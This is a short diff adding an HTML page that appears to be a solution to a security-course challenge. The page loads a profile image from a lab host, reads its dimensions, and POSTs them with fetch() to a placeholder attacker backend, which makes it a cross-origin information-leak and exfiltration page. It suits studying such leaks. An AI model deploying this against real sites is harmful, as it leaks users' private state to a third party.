@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Imagen Importante</title>
+</head>
+<body>
+    <h1>Imagen Importante</h1>
+    <img id="image" src="https://chl-4768d488-9429-490c-8813-c50c1a063834-imagen-importante.softwareseguro.com.ar/profile-pic" alt="Imagen importante" />
+
+    <script>
+        // Cuando la imagen carga, se obtiene el tamaño y se envía al backend
+        const img = document.getElementById('image');
+
+        img.onload = () => {
+            const width = img.naturalWidth;
+            const height = img.naturalHeight;
+
+            // Crear un objeto con el tamaño
+            const data = { width, height };
+
+            // Enviar al backend (reemplaza la URL por la de tu backend en Render)
+            fetch('https://tu-backend-en-render.com/api/image-size', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(res => res.json())
+            .then(response => {
+                console.log('Respuesta del backend:', response);
+            })
+            .catch(error => {
+                console.error('Error enviando el tamaño al backend:', error);
+            });
+        };
+    </script>
+</body>
+</html>
